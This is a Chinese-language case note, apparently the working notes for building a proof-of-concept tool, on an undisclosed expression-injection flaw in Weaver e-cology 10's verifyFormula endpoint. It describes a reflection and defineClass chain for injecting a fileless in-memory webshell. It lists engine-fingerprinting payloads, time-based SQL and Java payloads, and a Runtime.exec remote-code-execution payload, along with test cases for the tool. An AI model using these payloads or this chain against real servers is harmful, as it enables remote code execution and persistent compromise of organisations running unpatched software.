# 案例：泛微 e-cology 10 verifyFormula 表达式注入（未公开 1day，2026-08）

## 基本信息
- 接口：`POST /api/excel/formula/verifyFormula`
- 参数：`expressSql`（表单参数）
- 产品：泛微 e-cology 10（Java，Spring Boot 生态）
- 公开状态：未公开（Google/DDG/GitHub issues+commits/nuclei-templates/Gitee 均无记录）

## 已确认利用链（用户提供的样本情报）
表达式引擎**支持反射方法调用**：攻击者经 expressSql 传入 Java 反射链，
获取 Thread 上下文 ClassLoader 后调用 `defineClass` 动态加载恶意类**字节码字符串**，
实现内存马注入（Filter/Listener 型，无文件落地）。引擎特征吻合 JEXL / QLExpress 类。

## POC 指纹判定逻辑（探测 payload 集）
按回显特征分层判定引擎类型，全部排除"原样回显"防误报：

| probe | payload | 判定 |
|-------|---------|------|
| arith | `1+1` | body 含 2 且不含 "1+1" → arithmetic-exec |
| str_plus | `'a'+'b'` | body 含 ab → java-style-string |
| excel_sum | `SUM(1,2)` | body 含 3 → excel-formula-engine |
| jexl_dollar | `${1+1}` | body 含 2 → JEXL |
| spel_hash | `#{1+1}` | body 含 2 → SpEL |
| reflect_class | `''.getClass().getName()` | body 含 java.lang.String → JEXL/QLExpress(reflect) |
| sql_select | `SELECT 1` | body 含 1 且不含 "SELECT" → sql-exec |

时间型 payload：`Thread.sleep(5000)` 系（Java 引擎）、`AND SLEEP(5)` / `WAITFOR DELAY`（SQL）。
RCE 验证：`''.getClass().forName('java.lang.Runtime').getRuntime().exec(...)`（JEXL 风格）。

## 已公开相似漏洞（区分用，均非本漏洞）
- appThirdLogin + H2 JDBC 反序列化 RCE（2024-08 hw 情报，PoC 公开，修复 ≥10.69）
- getdata.jsp 未授权 SQLi（<10.75）
- /api/doc/out/more/list + /api/ec/dev/table/counts 前台 SQLi（<10.76，DES 加密绕过 WAF）
- E-Mobile OGNL 表达式注入（2021，E-Mobile 产品非 e-cology）

## 验证要点（mock 服务器）
覆盖场景：执行回显→vulnerable；原样回显→不误报；连接失败/404→短路；
sleep 慢响应→时间型判定；CLI -u/-o 入口。全部通过后交付。
